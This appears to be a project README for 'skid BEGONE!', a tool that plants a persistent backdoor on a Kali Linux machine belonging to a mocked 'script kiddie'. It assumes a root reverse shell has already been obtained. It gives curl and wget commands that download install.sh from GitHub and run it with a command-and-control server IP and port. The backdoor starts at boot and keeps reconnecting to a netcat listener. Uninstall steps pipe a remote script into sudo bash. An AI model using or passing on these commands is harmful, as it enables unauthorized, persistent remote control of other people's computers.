# skid BEGONE!

How to backdoor a script kiddie's Kali Linux install within seconds.

This assumes that the skid is at [peak mt. stupid](DK-effect.png) and thinks that the ping command can DDOS NASA's supercomputers.

## Using the backdoor

### Prerequisites

- skid must be a wannabe hacker (see assumption above)
- you must obtain a root reverse-shell
- skid must run Kali (other distros *might* work too)

### Actually running the script

```sh
curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh > /tmp/install.sh
bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
```

alternatively with wget:

```sh
wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh -O /tmp/install.sh
bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
```

By default the backdoor will start alongside other system services. If the service can't connect to the command and control server, it will wait for a few seconds and reconnect immediately after.

By "command an control server" I mean a server listening on the specified port with netcat.

### Uninstalling

```sh
curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh | sudo bash
```

alternatively with wget:

```sh
wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh -O - | sudo bash
```